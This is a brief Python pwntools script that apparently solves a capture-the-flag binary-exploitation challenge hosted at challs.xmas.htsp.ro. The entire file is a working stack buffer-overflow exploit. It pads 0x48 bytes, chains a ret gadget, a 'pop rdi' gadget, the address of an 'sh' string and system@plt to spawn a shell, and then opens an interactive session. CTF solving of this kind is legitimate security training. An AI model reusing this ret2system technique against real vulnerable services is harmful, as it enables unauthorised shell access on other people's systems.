#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')

if args.REMOTE:
	p = remote('challs.xmas.htsp.ro', 2001)
else:
	p = process(binary.path)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += 0x48 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'sh').__next__())
payload += p64(binary.plt.system)

p.sendlineafter('Christmas?\n', payload)
p.interactive()
